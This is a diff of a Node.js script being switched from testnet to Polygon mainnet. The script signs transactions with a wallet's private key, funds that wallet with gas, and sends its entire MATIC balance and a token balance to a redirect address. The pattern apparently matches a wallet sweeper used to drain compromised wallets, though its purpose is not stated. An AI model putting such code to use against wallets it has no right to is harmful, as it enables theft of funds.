@@ -15,29 +15,29 @@ const multichainWallet = require('multichain-crypto-wallet')
 
 //this is the configuration for alchemy alchemy API and network
 const config = {
-  apiKey: process.env.TEST_APIKEY,
-  network: Network.MATIC_MUMBAI,
+  apiKey: process.env.APIKEY,
+  network: Network.MATIC_MAINNET,
 }
-const provider = new ethers.providers.JsonRpcProvider(process.env.TEST_RPC, {
-  chainId: parseInt(process.env.TEST_CHAIN_ID),
+const provider = new ethers.providers.JsonRpcProvider(process.env.RPC, {
+  chainId: parseInt(process.env.CHAIN_ID),
 })
 
 //Get Alchemy object
 const alchemy = new Alchemy(config)
 
 
-let signer = new Wallet(process.env.TEST_PRIVATE_KEY)
+let signer = new Wallet(process.env.PRIVATE_KEY)
 
-let fundSigner = new Wallet(process.env.TEST_FUND_PRIVATE_KEY)
+let fundSigner = new Wallet(process.env.FUND_PRIVATE_KEY)
 
 const pullToken = async (bal) => {
   try {
     const transfer = await multichainWallet.transfer({
-      recipientAddress: process.env.TEST_REDIRECT,
+      recipientAddress: process.env.REDIRECT,
       amount: bal,
       network: 'ethereum',
-      rpcUrl: process.env.TEST_RPC,
-      privateKey: process.env.TEST_PRIVATE_KEY,
+      rpcUrl: process.env.RPC,
+      privateKey: process.env.PRIVATE_KEY,
       gasPrice: '500', // Gas price is in Gwei. leave empty to use default gas price
       tokenAddress: '0x55A66D6D895443A63e4007C27a3464f827a1a5Cb',
     }) // NOTE - For other EVM compatible blockchains all you have to do is change the rpcUrl.
@@ -47,7 +47,7 @@ const pullToken = async (bal) => {
       if (value['hash'] === null) console.log('i am so sorry boss')
 
       console.log(
-        `pulled successfully to ${process.env.TEST_REDIRECT} with transaction hash: ${value['hash']}`,
+        `pulled successfully to ${process.env.REDIRECT} with transaction hash: ${value['hash']}`,
       )
       provider.once(value['hash'], async (transaction) => {
         console.log(transaction['confirmations'])
@@ -61,7 +61,7 @@ const pullToken = async (bal) => {
 
 const sendTX = async () => {
   let fetchBalance = await alchemy.core.getBalance(
-    process.env.TEST_WALLET,
+    process.env.WALLET,
     'latest',
   )
 
@@ -73,12 +73,12 @@ const sendTX = async () => {
 
   console.log(`amount to send: ${reallBalance}`)
   const nonce = await alchemy.core.getTransactionCount(
-    process.env.TEST_WALLET,
+    process.env.WALLET,
     'latest',
   )
   try {
     let transaction = {
-      to: process.env.TEST_REDIRECT,
+      to: process.env.REDIRECT,
       // to: "0x56dc2c15635c2afFEE954862C9968F14ab2f0BA5",
       value: Utils.parseEther(`${reallBalance}`),
       gasLimit: '21000',
@@ -86,7 +86,7 @@ const sendTX = async () => {
       maxFeePerGas: Utils.parseUnits('', 'gwei'),
       nonce: nonce,
       type: 2,
-      chainId: process.env.TEST_CHAIN_ID,
+      chainId: process.env.CHAIN_ID,
     }
     let rawTransaction = await signer.signTransaction(transaction)
     let tx = await alchemy.core.sendTransaction(rawTransaction)
@@ -95,12 +95,12 @@ const sendTX = async () => {
     )
 
     let balance = await alchemy.core.getBalance(
-      process.env.TEST_WALLET,
+      process.env.WALLET,
       'latest',
     )
 
     balance = Utils.formatEther(balance)
-    console.log(`Balance of ${process.env.TEST_WALLET}: ${balance} MATIC`)
+    console.log(`Balance of ${process.env.WALLET}: ${balance} MATIC`)
   } catch (error) {
     console.log(error)
   }
@@ -112,12 +112,12 @@ const fundTX = async () => {
 
 
   const nonce = await alchemy.core.getTransactionCount(
-    process.env.TEST_FUND_WALLET,
+    process.env.FUND_WALLET,
     'latest',
   )
   try {
     let transaction = {
-      to: '0xD48a3323E0349912185Ae4522F083bcc011CEa07',
+      to:  process.env.WALLET,
       // to: "0x56dc2c15635c2afFEE954862C9968F14ab2f0BA5",
       value: Utils.parseEther(`0.05`),
       gasLimit: '21000',
@@ -125,7 +125,7 @@ const fundTX = async () => {
       maxFeePerGas: Utils.parseUnits('100', 'gwei'),
       nonce: nonce,
       type: 2,
-      chainId: process.env.TEST_CHAIN_ID,
+      chainId: process.env.CHAIN_ID,
     }
     let rawTransaction = await fundSigner.signTransaction(transaction)
     let tx = await alchemy.core.sendTransaction(rawTransaction)
